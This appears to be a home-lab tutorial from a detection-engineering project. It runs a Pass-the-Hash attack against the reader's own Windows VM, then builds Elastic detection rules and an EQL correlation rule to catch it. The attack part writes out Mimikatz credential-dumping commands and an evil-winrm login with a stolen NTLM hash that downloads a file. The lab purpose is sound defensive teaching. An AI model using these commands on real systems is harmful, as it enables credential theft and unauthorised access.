# Pass the Hash Attack 

<br />

<p align="center">
<img src="https://i.imgur.com/u80FCmz.png" height="50%" width="50%" alt="Detection Engineering Logo Team Ghost"/>
</p>


<h2>Description</h2>

A Pass-the-Hash (PtH) attack is a cybersecurity exploit where an attacker obtains hashed credentials, such as password hashes, and uses them to authenticate and access network resources without the need to crack the hashes.

In this section of the project, we will execute a Pass-the-Hash attack by using Mimikatz to steal the password hash of an Administrator account. Following this, we will use "EvilWinRM" to log into the Windows VM and exfiltrate some data.

</br>

<h2>Pass the Hash Attack</h2>

<h3>Attack Setup:</h3>

The first step in setting up this attack is to create a new user on your Windows 11 VM. Start by navigating to the Windows settings and selecting "Accounts." Next, choose "Other Users" and click the blue "Add Account" button. Select the option "I don't have this person's sign-in information," then click on "Add a user without a Microsoft account." Follow the prompts to enter the required information and create the new account.

<p align="center">
<img src="https://i.imgur.com/Hq8VoJo.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

After creating the new account, the next step is to change its type to "Administrator." To do this, open the "Control Panel" and navigate to "User Accounts." Select "Manage another account" and locate the user account you just created. Click on the account and then choose "Change the account type." Finally, select "Administrator" and save the changes.

Next, log into the newly created user account and save the provided .txt file into the Documents folder. This file will be the one we will exfiltrate during the attack.

<p align="center">
<img src="https://i.imgur.com/1iNDFMm.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>


Now that we have our user account created, we will proceed to enable WinRM and add the user account to the "Remote Management Users" group. To do this, execute the following PowerShell commands:

```powershell

winrm quickconfig

```

```powershell

Add-LocalGroupMember -Group "Remote Management Users" -Member "Enter your user account here"

```
<p align="center">
<img src="https://i.imgur.com/gbFnbVx.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, we need to download Mimikatz on our Windows 11 VM. To do this, visit the [Mimikatz GitHub repository](https://github.com/ebalo55/mimikatz) and download the repository by clicking the green "Code" button and selecting "Download ZIP". After downloading, extract the contents of the ZIP file. You will find the Mimikatz executable inside the "x64" folder.

<p align="center">
<img src="https://imgur.com/ujsZYj6.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

We are now ready to launch the attack.

</br>

<h3>Attack Execution:</h3>

To execute this attack, first ensure that the Administrator account is logged in. To do this, log into the user account you created, and then switch back to the main "Users" account. Afterward, launch mimikatz.exe as Administrator and execute the following commands:

```powershell

privilege::debug

```

```powershell

sekurlsa::logonpasswords full

```

These commands retrieve detailed information about all logged-on user sessions, including plaintext passwords, NTLM hashes, and Kerberos tickets. Scroll up until you find the user account you created. Then, locate the "NTLM" field and copy its value. This value represents the hashed password for the user account you set up.

<p align="center">
<img src="https://imgur.com/5svIqfT.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

The next step is to use EvilWinRM to connect to our Windows 11 VM and exfiltrate some data. To do this, start your Kali Linux VM and open a terminal. Then, enter the following commands:

```bash
sudo evil-winrm -i 192.168.1.4 -u YourUserName -H YourHashValue
```

```bash
download C:\Users\YourUserAccount\Documents\ValuableData.txt ./ValuableData.txt
```

You should now have this .txt file on your Kali Linux VM.

<p align="center">
<img src="https://imgur.com/f88J0z4.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

We are now ready to create our detection for this attack.


</br>

<h2>Mimikatz, Network Logon, & WinRM Detection</h2>

This detection will be slightly different, as we will create three separate detection rules that will serve as the foundation for our primary detection rule.

<h3>Mimikatz Detection Query:</h3>

To create the query for detecting Mimikatz, we need to search for logs related to Mimikatz within our Elastic environment. After conducting some research, we have identified the following query to use for our detection rule:

```sql
data_stream.dataset : "windows.sysmon_operational" and process.name : "mimikatz.exe" and winlog.event_data.Description : "mimikatz for Windows" and message : *mimikatz*
```
- data_stream.dataset : "windows.sysmon_operational" looks for logs that have the windows.sysmon_operational dataset.
- process.name : "mimikatz.exe" looks for logs that have the process mimikatz.exe
- winlog.event_data.Description : "mimikatz for Windows" looks for logs that contain "mimikatz for Windows" as the event data description
- message : *mimikatz* looks for logs that contains the work "mimikatz" in the message field

<p align="center">
<img src="https://imgur.com/IGQwXGV.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now that we have our query we are going to proceed to create our detection rule.

</br>

<h3>Mimikatz Detection Rule</h3>

<b>Define Rule:</b>

Now that we have our query, we can proceed to create our detection rule. To do this, copy the query and click on the hamburger icon in the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Then click on "Detection Rules (SIEM)" and choose "Create New Rule." Ensure that the "Custom Query" option is selected, then scroll down and paste the query. Next, scroll down to the "Suppress alerts by" option, enter "host.id," and select "Per time period" with a duration of 5 minutes. This configuration will help reduce noise from repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://imgur.com/h5qfNFA.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next, we will fill out the "About Rule" section. Name the alert "Mimikatz has been detected on endpoint!" and provide a description for the rule. Set the "Default severity" to "High." Then, click on "Advanced Settings." Scroll down until you see "MITRE ATT&CK threats" and select "Credential Access" for the tactic. Add a technique and set it to "OS Credential Dumping," then add a subtechnique and set it to "LSASS Memory."

<p align="center">
<img src="https://imgur.com/33uA9kz.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/YKlXNxB.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will configure the duration for how long the rule should run. Set the rule to execute every 5 minutes with a look-back time of 5 minutes. You can adjust these settings according to your preferences.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we need to configure the action Elastic should take when this rule triggers. Options include sending an email, sending a message via Slack, using Microsoft Teams, and more. For this project, you don’t need to set any actions. Simply click the "Create & Enable Rule" button to complete the setup.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule, we can execute Mimikatz to trigger the alert. To view the alert, navigate to "Security" and select the "Alerts" option.

</br>

<h3>Network Logon Query:</h3>

To create the query for detecting network logons, we need to search for logs related to logon type 3 in our Elastic environment. After some research, we have identified the following query to use for our detection rule:

```sql
data_stream.dataset : "system.security" and event.code : "4624" and winlog.event_data.LogonType : "3"
```
- data_stream.dataset : "system.security" filters the logs to include only those from the system.security dataset.
- event.code : "4624" filters the logs to include only events with the code 4624, which indicates a successful logon.
- winlog.event_data.LogonType : "3" further filters the logs to include only logon events with a LogonType of 3, which represents a network logon


<p align="center">
<img src="https://imgur.com/qe2oIWf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now that we have our query we are going to proceed to create our detection rule.

</br>

<h3>Network Logon Detection Rule</h3>

<b>Define Rule:</b>

To create the detection rule for network logons, start by clicking on the hamburger icon in the top-left corner of the page. Scroll down to "Security" and select the "Rules" option, then click on "Detection Rules (SIEM)" and choose "Create New Rule." Ensure that the "Custom Query" option is selected, then scroll down and paste your query into the provided field. Next, navigate to the "Suppress alerts by" section, enter "host.id" in the suppression field, and select "Per time period," setting the period to 5 minutes. This configuration will help reduce the noise from repetitive alerts by grouping similar alerts together based on the specified time interval.

<p align="center">
<img src="https://imgur.com/zMuYOoX.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next, fill out the About Rule section by naming the alert "A Network Logon to This Machine Has Been Detected" and providing a description for the rule. Set the "Default severity" to "Medium." Then, click on "Advanced Settings." Scroll down to find "MITRE ATT&CK threats," select "Initial Access" as the tactic, and add a technique, setting it to "Valid Accounts." Finally, add a subtechnique and set it to "Local Accounts."

<p align="center">
<img src="https://imgur.com/nUaKPbn.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/S6U0pdG.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will configure the duration for how long the rule should run. Set the rule to execute every 5 minutes with a look-back time of 5 minutes. You can adjust these settings according to your preferences.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we need to configure the action Elastic should take when this rule triggers. Options include sending an email, sending a message via Slack, using Microsoft Teams, and more. For this project, you don’t need to set any actions. Simply click the "Create & Enable Rule" button to complete the setup.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set up our rule, we can execute a network logon to trigger the alert. To view the alert, go to "Security" and select the "Alerts" option.

</br>

<h3>Winrm Query:</h3>

To create a query for detecting WinRM connections, we'll need to focus on logs related to WinRM activity within our Elastic environment. After conducting research, we have determined that the following query is suitable for this detection rule:

```sql
destination.port : "5985" and zeek.http: * and user_agent.original : "Ruby WinRM Client (2.8.3, ruby 3.1.2 (2022-04-12))" and url.path : "/wsman"
```
- destination.port : "5985" filters the logs to include only those with a destination port of 5985, which is commonly used for Windows Remote Management (WinRM) over HTTP.
- zeek.http: * includes all logs that have HTTP traffic data captured by Zeek.
- user_agent.original : "Ruby WinRM Client (2.8.3, ruby 3.1.2 (2022-04-12))" filters logs where the user agent string matches the specified Ruby WinRM Client version.
- url.path : "/wsman" filters logs to include only those with a URL path of /wsman, which is used by WinRM.

<p align="center">
<img src="https://imgur.com/ouooHc2.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now that we have our query we are going to proceed to create our detection rule.

</br>

<h3>WinRM Detection Rule</h3>

<b>Define Rule:</b>

To create the detection rule, first, click on the hamburger icon in the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Then, click on "Detection Rules (SIEM)" and choose "Create New Rule." Ensure that the "Custom Query" option is selected, then scroll down and paste the query related to WinRM connections. Next, scroll down to the "Suppress alerts by" option, enter "source.ip," and select "Per time period," setting the period to 10 minutes. This configuration will reduce the noise from repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://imgur.com/7BhUY7y.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next, we will fill out the "About Rule" section. Name the alert "WinRM Connection Detected" and provide a description for the rule. Set the "Default severity" to "High," then click on "Advanced Settings." Scroll down until you find "MITRE ATT&CK threats," select "Initial Access" for the tactic, and add a technique by setting it to "External Remote Services."

<p align="center">
<img src="https://i.imgur.com/8p6HCHV.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/VRZ7lOu.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will configure the duration for how long the rule should run. Set the rule to execute every 5 minutes with a look-back time of 5 minutes. You can adjust these settings according to your preferences.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we need to configure the action Elastic should take when this rule triggers. Options include sending an email, sending a message via Slack, using Microsoft Teams, and more. For this project, you don’t need to set any actions. Simply click the "Create & Enable Rule" button to complete the setup.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule, we can execute EvilWinRM, which should trigger the alert. To view the alert, go to "Security" and select the "Alerts" option.

</br>

Now that we have created these 3 detection rule we are ready to proceed to create our main detection rule.

<p align="center">
<img src="https://i.imgur.com/SOC7kG1.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<h2>Pass the Hash Detection</h2>

<h3>Pass the Hash Query:</h3>

To create our query, we will use the Event Query Language (EQL). EQL is a specialized query language designed for event-based data, enabling efficient search, filtering, and correlation of events. It is especially useful in cybersecurity for detecting patterns and sequences of events that may indicate potential security incidents.

The EQL query that we will be using for this detection rule is :

```SQL
sequence with maxspan = 10m
  [any where kibana.alert.rule.name == "A Network Logon to this machine has been detected"]
  [any where kibana.alert.rule.name == "WinRM Connection Detected"]
  [any where kibana.alert.rule.name == "Mimikatz has been detected on endpoint!"]
```

This EQL query is used to correlate these three alerts within a 10-minute window to identify potential Pass-the-Hash attacks, where an attacker might use a combination of network logons, WinRM connections, and tools like Mimikatz to compromise a system.

Now that we have our query we will now proceed to create our detection rule.

</br>

<h3>Pass the Hash Detection Rule</h3>

<b>Define Rule:</b>

Now that we have our query, we will proceed to create our detection rule. To do this, copy the query and click on the hamburger icon in the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Next, click on "Detection Rules (SIEM)" and then select "Create New Rule." Ensure that the "EQL" option is selected, then scroll down and paste our query.

<p align="center">
<img src="https://imgur.com/6SNUnZM.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>About Rule:</b>

Next, we will fill out the About Rule section. Name the alert "A Pass the Hash Attack Detected" and provide a description for the rule. Set the "Default severity" to "Critical," then click on "Advanced Settings." Scroll down until you see "MITRE ATT&CK threats." Select "Lateral Movement" for the tactic and add the technique "Remote Services" and subtechnique "Windows Remote Management." Next, add another MITRE tactic and set it to "Initial Access," then include the technique "Valid Accounts" and subtechnique "Local Accounts." Finally, add a last MITRE tactic and set it to "Credential Access," then add the technique "OS Credential Dumping" and subtechnique "LSASS Memory."


<p align="center">
<img src="https://i.imgur.com/8p6HCHV.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://imgur.com/TTQW0XI.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will configure the duration for how long the rule should run. Set the rule to execute every 5 minutes with a look-back time of 5 minutes. You can adjust these settings according to your preferences.

<p align="center">
<img src="https://i.imgur.com/3cM7k5K.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we need to configure the action Elastic should take when this rule triggers. Options include sending an email, sending a message via Slack, using Microsoft Teams, and more. For this project, you don’t need to set any actions. Simply click the "Create & Enable Rule" button to complete the setup.

<p align="center">
<img src="https://i.imgur.com/8Hm9GXc.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule, we can execute the Pass-the-Hash attack to trigger the alert. To view the alert, navigate to "Security" and select the "Alerts" option. The result should look like this:

<p align="center">
<img src="https://imgur.com/ikEMsII.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<h3>Pass the Hash Attack Complete!</h3>





